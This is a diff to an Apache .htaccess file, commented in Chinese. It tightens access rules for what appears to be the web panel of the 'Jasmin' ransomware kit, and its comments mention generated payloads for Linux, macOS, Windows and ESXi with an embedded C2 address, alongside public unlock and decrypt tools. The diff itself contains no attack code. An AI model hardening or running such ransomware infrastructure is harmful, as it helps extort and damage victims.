@@ -1,23 +1,35 @@
+# ── 目录与重写 ──
+Options -Indexes
 RewriteEngine On
 
-# Block access to sensitive files
-<FilesMatch "\.(env|sql|tpl|md)$">
-    Order allow,deny
-    Deny from all
+# ── 隐藏文件（.env / .installed / .schema_v3 / .key_secret / .pw_changed ...）──
+# 此前只拦 .env，导致 .installed、.schema_v3 等可被公开读取
+<FilesMatch "^\..+$">
+    Require all denied
 </FilesMatch>
 
-# Block plaintext private key and secret (only .pem.enc is public)
-<FilesMatch "^\.key_secret$|^jasmin_private\.pem$">
-    Order allow,deny
-    Deny from all
+# ── 归档 / 备份 / 配置 / 文档 —— 不应从 web 根下载 ──
+# 注意：payloads/ 下需要公开的是 jasmin_unlock.sh|.ps1|.py、jasmin_decrypt*、
+#       jasmin_private.pem.enc（均不在下列扩展名内），因此不受影响。
+<FilesMatch "\.(zip|tar|gz|tgz|bz2|xz|rar|7z|bak|old|orig|save|swp|swo|log|sql|tpl|md|txt|env|ini|conf|cfg|inc|yml|yaml|lock|json|gitignore)$">
+    Require all denied
 </FilesMatch>
 
-# Block access to directories
-Options -Indexes
+# ── 明文私钥与口令（只允许 .pem.enc 公开）──
+<FilesMatch "^jasmin_private\.pem$|^\.key_secret$">
+    Require all denied
+</FilesMatch>
 
-# Block includes directory
+# ── 敏感目录 ──
 <IfModule mod_rewrite.c>
     RewriteRule ^includes/ - [F,L]
     RewriteRule ^database/ - [F,L]
     RewriteRule ^templates/ - [F,L]
+
+    # 生成的载荷内嵌 C2 地址与握手密钥，不能匿名下载（应由需登录的下载流程下发）。
+    # payloads/ 下仍公开的是解密工具与加密私钥（jasmin_unlock.*、jasmin_decrypt*、
+    # jasmin_diagnose.sh、jasmin_private.pem.enc），它们不以 jasmin_{平台}_ 开头。
+    RewriteRule ^payloads/jasmin_(linux|macos|win|esxi)_ - [F,L]
+    # 密钥备份（keygen 重建时归档）同样不可下载
+    RewriteRule ^payloads/.*\.bak\. - [F,L]
 </IfModule>
